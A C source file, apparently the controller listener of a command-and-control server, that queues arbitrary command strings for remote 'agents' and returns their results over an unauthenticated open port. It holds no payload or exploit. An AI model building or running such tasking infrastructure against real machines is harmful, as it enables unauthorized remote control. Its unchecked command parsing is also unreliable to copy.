#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "../include/utils.h"
#include "../include/controller.h"


void handle_task_injection(int ctrl_sock, const char *buf) {
    char agent_id[64] = {0};
    if (sscanf(buf, "TASK %63s", agent_id) < 1) {
        send(ctrl_sock, "ERROR", 5, 0);
        return;
    }
    const char *cmd = buf + strlen("TASK ") + strlen(agent_id) + 1;
    pthread_mutex_lock(&agents_mutex);
    int idx = find_agent(agent_id);
    if (idx < 0) {
        pthread_mutex_unlock(&agents_mutex);
        send(ctrl_sock, "UNKNOWN", 7, 0);
        return;
    }
    strncpy(agents[idx].task, cmd, sizeof(agents[idx].task) - 1);
    agents[idx].has_task = 1;
    pthread_mutex_unlock(&agents_mutex);
    send(ctrl_sock, "OK", 2, 0);
}

void *listen_controler(void *arg) {
    (void)arg;
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT_CONTROLER);

    bind(srv, (struct sockaddr*)&addr, sizeof(addr));
    listen(srv, SOMAXCONN);
    printf("[*] En écoute controler sur le port %d\n", PORT_CONTROLER);

    while (1) {
        int ctrl_sock = accept(srv, NULL, NULL);
        if (ctrl_sock < 0) continue;

        char buf[2048] = {0};
        int n = recv(ctrl_sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) { close(ctrl_sock); continue; }
        buf[n] = '\0';

        if (strncmp(buf, "TASK ", 5) == 0)
            handle_task_injection(ctrl_sock, buf);
        else if (strncmp(buf, "LIST", 4) == 0) {
            char list[2048] = {0};
            pthread_mutex_lock(&agents_mutex);
            for (int i = 0; i < MAX_CLIENTS; i++) {
                if (agents[i].agent_id[0] != '\0') {
                    strncat(list, agents[i].agent_id, sizeof(list) - strlen(list) - 1);
                    strncat(list, "\n", sizeof(list) - strlen(list) - 1);
                }
            }
            pthread_mutex_unlock(&agents_mutex);
            send(ctrl_sock, list, strlen(list), 0);
        } else if (strncmp(buf, "RESULT ", 7) == 0) {
            char agent_id[64] = {0};
            sscanf(buf, "RESULT %63s", agent_id);
            pthread_mutex_lock(&agents_mutex);
            int idx = find_agent(agent_id);
            if (idx < 0 || !agents[idx].has_result) {
                pthread_mutex_unlock(&agents_mutex);
                send(ctrl_sock, "NONE", 4, 0);
            } else {
                send(ctrl_sock, agents[idx].result, strlen(agents[idx].result), 0);
                memset(agents[idx].result, 0, sizeof(agents[idx].result));
                agents[idx].has_result = 0;
                pthread_mutex_unlock(&agents_mutex);
            }
        } else
            send(ctrl_sock, "UNKNOWN", 7, 0);
        close(ctrl_sock);
    }
    return NULL;
}